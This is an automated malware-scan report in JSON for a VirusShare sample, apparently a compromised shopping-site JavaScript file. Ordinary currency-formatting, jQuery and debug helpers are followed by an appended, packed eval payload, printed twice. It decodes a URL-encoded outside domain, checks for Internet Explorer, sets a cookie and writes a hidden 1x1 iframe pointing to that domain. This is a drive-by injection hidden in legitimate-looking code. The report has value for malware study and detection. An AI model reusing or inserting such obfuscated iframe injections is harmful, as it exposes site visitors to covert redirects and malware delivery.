{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "write": "May write to a file"
        },
        "macro": "\n//return a formatted price\nfunction formatCurrency(price, currencyFormat, currencySign){\n\t//if you modified this function, don't forget to modify the PHP function displayPrice (in the Tools.php class)\n\tif(currencyFormat == 1)\n\t\treturn currencySign + formatNumber(price,priceDisplayPrecision,',', '.');\n\tif(currencyFormat == 2)\n\t\treturn (formatNumber(price,priceDisplayPrecision,' ',',') + ' ' + currencySign);\n\tif(currencyFormat == 3)\n\t\treturn (currencySign + ' ' + formatNumber(price,priceDisplayPrecision,' ',','));\n\tif(currencyFormat == 4)\n\t\treturn (formatNumber(price,priceDisplayPrecision,',', '.') + currencySign);\n\treturn price;\n}\n\n//return a formatted number\nfunction formatNumber(value,numberOfDecimal,thousenSeparator, virgule) {\n\tvalue = value.toFixed(numberOfDecimal);\n\tif (parseInt(numberOfDecimal) == 0)\n\t\treturn (value);\n\tvar val_string = value+'';\n\tvar tmp = val_string.split('.');\n\tvar abs_val_string = (tmp.length == 2) ? tmp[0] : val_string;\n\tvar deci_string = ('0.' + (tmp.length == 2 ? tmp[1] : 0)).substr(2);\n\tvar nb = abs_val_string.length;\n\tfor (var i=1;i<4;i++)\n\t\tif (value>=Math.pow(10,(3*i)))\n\t\t\tabs_val_string=abs_val_string.substring(0,nb-(3*i))+thousenSeparator+abs_val_string.substring(nb-(3*i));\n\treturn abs_val_string + virgule + (deci_string > 0 ? deci_string : '00');\n}\n\n//change the text of a jQuery element with a sliding effect (velocity could be a number in ms, 'slow' or 'fast', effect1 and effect2 could be slide, fade, hide, show)\nfunction updateTextWithEffect(jQueryElement, text, velocity, effect1, effect2, newClass)\n{\n\tif(jQueryElement.text() != text)\n\t\tif(effect1 == 'fade')\n\t\t\tjQueryElement.fadeOut(velocity, function(){\n\t\t\t\t$(this).addClass(newClass);\n\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);\n\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);\n\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity, function(){});\n\t\t\t});\n\t\telse if(effect1 == 'slide')\n\t\t\tjQueryElement.slideUp(velocity, function(){\n\t\t\t\t$(this).addClass(newClass);\n\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);\n\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);\n\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity);\n\t\t\t});\n\t\t\telse if(effect1 == 'hide')\n\t\t\t\tjQueryElement.hide(velocity, function(){\n\t\t\t\t\t$(this).addClass(newClass);\n\t\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);\n\t\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);\n\t\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity);\n\t\t\t\t});\n}\n\n//show a JS debug\nfunction dbg(value){\n\tvar active = false;//true for active\n\tvar firefox = true;//true if debug under firefox\n\n\tif (active)\n\t\tif (firefox)\n\t\t\tconsole.log(value);\n\t\telse\n\t\t\talert(value);\t\n}\n\n/**\n* Function : print_r()\n* Arguments: The data  - array,hash(associative array),object\n*            The level - OPTIONAL\n* Returns  : The textual representation of the array.\n* This function was inspired by the print_r function of PHP.\n* This will accept some data as the argument and return a\n* text that will be a more readable version of the\n* array/hash/object that is given.\n*/\nfunction print_r(arr,level) {\n\tvar dumped_text = \"\";\n\tif(!level) level = 0;\n\t\n\t//The padding given at the beginning of the line.\n\tvar level_padding = \"\";\n\tfor(var j=0;j<level+1;j++) level_padding += \"    \";\n\t\n\tif(typeof(arr) == 'object') { //Array/Hashes/Objects \n\t\tfor(var item in arr) {\n\t\t\tvar value = arr[item];\n\t\t\t\n\t\t\tif(typeof(value) == 'object') { //If it is an array,\n\t\t\t\tdumped_text += level_padding + \"'\" + item + \"' ...\\n\";\n\t\t\t\tdumped_text += dump(value,level+1);\n\t\t\t} else {\n\t\t\t\tdumped_text += level_padding + \"'\" + item + \"' => \\\"\" + value + \"\\\"\\n\";\n\t\t\t}\n\t\t}\n\t} else { //Stings/Chars/Numbers etc.\n\t\tdumped_text = \"===>\"+arr+\"<===(\"+typeof(arr)+\")\";\n\t}\n\treturn dumped_text;\n}\n\n//verify if value is in the array\nfunction in_array(value, array)\n{\n\tfor (var i in array) if (array[i] == value) return true;\n\treturn false;\n}\n\nsa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
    },
    "filename": "VirusShare_c5dccc5c50295257db29aeae90def7d5",
    "filesize": 4451,
    "filetype": "ASCII text, with very long lines",
    "hashes": {
        "md5": "c5dccc5c50295257db29aeae90def7d5",
        "sha1": "d7821b9f0c0f0b6a4fd8517bac2805f65bf6a640",
        "sha256": "eeb241b4d401c1a20f851ef7ce3198d59002cd89a7d12dbebe1875b60e3ee26c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "//return a formatted price",
            "function formatCurrency(price, currencyFormat, currencySign){",
            "\t//if you modified this function, don't forget to modify the PHP function displayPrice (in the Tools.php class)",
            "\tif(currencyFormat == 1)",
            "\t\treturn currencySign + formatNumber(price,priceDisplayPrecision,',', '.');",
            "\tif(currencyFormat == 2)",
            "\t\treturn (formatNumber(price,priceDisplayPrecision,' ',',') + ' ' + currencySign);",
            "\tif(currencyFormat == 3)",
            "\t\treturn (currencySign + ' ' + formatNumber(price,priceDisplayPrecision,' ',','));",
            "\tif(currencyFormat == 4)",
            "\t\treturn (formatNumber(price,priceDisplayPrecision,',', '.') + currencySign);",
            "\treturn price;",
            "//return a formatted number",
            "function formatNumber(value,numberOfDecimal,thousenSeparator, virgule) {",
            "\tvalue = value.toFixed(numberOfDecimal);",
            "\tif (parseInt(numberOfDecimal) == 0)",
            "\t\treturn (value);",
            "\tvar val_string = value+'';",
            "\tvar tmp = val_string.split('.');",
            "\tvar abs_val_string = (tmp.length == 2) ? tmp[0] : val_string;",
            "\tvar deci_string = ('0.' + (tmp.length == 2 ? tmp[1] : 0)).substr(2);",
            "\tvar nb = abs_val_string.length;",
            "\tfor (var i=1;i<4;i++)",
            "\t\tif (value>=Math.pow(10,(3*i)))",
            "\t\t\tabs_val_string=abs_val_string.substring(0,nb-(3*i))+thousenSeparator+abs_val_string.substring(nb-(3*i));",
            "\treturn abs_val_string + virgule + (deci_string > 0 ? deci_string : '00');",
            "//change the text of a jQuery element with a sliding effect (velocity could be a number in ms, 'slow' or 'fast', effect1 and effect2 could be slide, fade, hide, show)",
            "function updateTextWithEffect(jQueryElement, text, velocity, effect1, effect2, newClass)",
            "\tif(jQueryElement.text() != text)",
            "\t\tif(effect1 == 'fade')",
            "\t\t\tjQueryElement.fadeOut(velocity, function(){",
            "\t\t\t\t$(this).addClass(newClass);",
            "\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);",
            "\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);",
            "\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity, function(){});",
            "\t\t\t});",
            "\t\telse if(effect1 == 'slide')",
            "\t\t\tjQueryElement.slideUp(velocity, function(){",
            "\t\t\t\t$(this).addClass(newClass);",
            "\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);",
            "\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);",
            "\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity);",
            "\t\t\t});",
            "\t\t\telse if(effect1 == 'hide')",
            "\t\t\t\tjQueryElement.hide(velocity, function(){",
            "\t\t\t\t\t$(this).addClass(newClass);",
            "\t\t\t\t\tif(effect2 == 'fade') $(this).text(text).fadeIn(velocity);",
            "\t\t\t\t\telse if(effect2 == 'slide') $(this).text(text).slideDown(velocity);",
            "\t\t\t\t\t\telse if(effect2 == 'show')\t$(this).text(text).show(velocity);",
            "\t\t\t\t});",
            "//show a JS debug",
            "function dbg(value){",
            "\tvar active = false;//true for active",
            "\tvar firefox = true;//true if debug under firefox",
            "\tif (active)",
            "\t\tif (firefox)",
            "\t\t\tconsole.log(value);",
            "\t\telse",
            "\t\t\talert(value);\t",
            "* Function : print_r()",
            "* Arguments: The data  - array,hash(associative array),object",
            "*            The level - OPTIONAL",
            "* Returns  : The textual representation of the array.",
            "* This function was inspired by the print_r function of PHP.",
            "* This will accept some data as the argument and return a",
            "* text that will be a more readable version of the",
            "* array/hash/object that is given.",
            "function print_r(arr,level) {",
            "\tvar dumped_text = \"\";",
            "\tif(!level) level = 0;",
            "\t//The padding given at the beginning of the line.",
            "\tvar level_padding = \"\";",
            "\tfor(var j=0;j<level+1;j++) level_padding += \"    \";",
            "\tif(typeof(arr) == 'object') { //Array/Hashes/Objects ",
            "\t\tfor(var item in arr) {",
            "\t\t\tvar value = arr[item];",
            "\t\t\tif(typeof(value) == 'object') { //If it is an array,",
            "\t\t\t\tdumped_text += level_padding + \"'\" + item + \"' ...\\n\";",
            "\t\t\t\tdumped_text += dump(value,level+1);",
            "\t\t\t} else {",
            "\t\t\t\tdumped_text += level_padding + \"'\" + item + \"' => \\\"\" + value + \"\\\"\\n\";",
            "\t\t\t}",
            "\t} else { //Stings/Chars/Numbers etc.",
            "\t\tdumped_text = \"===>\"+arr+\"<===(\"+typeof(arr)+\")\";",
            "\treturn dumped_text;",
            "//verify if value is in the array",
            "function in_array(value, array)",
            "\tfor (var i in array) if (array[i] == value) return true;",
            "\treturn false;",
            "sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.299086",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
